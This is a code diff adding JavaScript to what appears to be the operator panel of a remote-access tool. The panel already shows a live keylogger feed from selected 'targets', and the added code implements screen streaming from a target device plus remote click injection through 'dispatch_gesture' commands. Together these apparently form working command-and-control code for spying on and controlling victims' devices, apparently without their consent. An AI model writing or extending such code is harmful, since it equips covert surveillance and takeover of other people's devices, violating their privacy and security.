@@ -141,6 +141,55 @@ socket.on('keylog_feed', (data) => {
     el.scrollTop = el.scrollHeight; // Auto-scroll
 });
 
+// VNC logic
+let vncInterval = null;
+function startStream() {
+    if(!currentTarget || currentTarget === 'all') return alert("Select a specific target first.");
+    document.getElementById('vnc-overlay').style.display = 'none';
+    
+    // Request stream frame every 1s
+    vncInterval = setInterval(() => {
+        sendCommand('request_frame');
+    }, 1500);
+}
+
+function stopStream() {
+    clearInterval(vncInterval);
+    vncInterval = null;
+    document.getElementById('vnc-overlay').innerHTML = 'NO SIGNAL<br>Click Start Stream';
+    document.getElementById('vnc-overlay').style.display = 'block';
+    document.getElementById('vnc-screen').src = '';
+}
+
+socket.on('screen_frame', (data) => {
+    // Expected data is base64
+    document.getElementById('vnc-overlay').style.display = 'none';
+    document.getElementById('vnc-screen').src = `data:image/jpeg;base64,${data.base64}`;
+});
+
+function handleVncClick(event) {
+    if(!vncInterval) return;
+    const rect = event.target.getBoundingClientRect();
+    const xPercent = (event.clientX - rect.left) / rect.width;
+    const yPercent = (event.clientY - rect.top) / rect.height;
+    
+    sendCommand('dispatch_gesture', { xPercent: xPercent, yPercent: yPercent });
+    
+    // Visual feedback
+    const dot = document.createElement('div');
+    dot.style.position = 'absolute';
+    dot.style.left = `${(xPercent * 100)}%`;
+    dot.style.top = `${(yPercent * 100)}%`;
+    dot.style.width = '10px';
+    dot.style.height = '10px';
+    dot.style.background = 'rgba(255, 42, 109, 0.8)';
+    dot.style.borderRadius = '50%';
+    dot.style.transform = 'translate(-50%, -50%)';
+    dot.style.pointerEvents = 'none';
+    event.currentTarget.appendChild(dot);
+    setTimeout(() => dot.remove(), 500);
+}
+
 // Chat Logic
 function sendChatMessage() {
     const input = document.getElementById('chat-input');
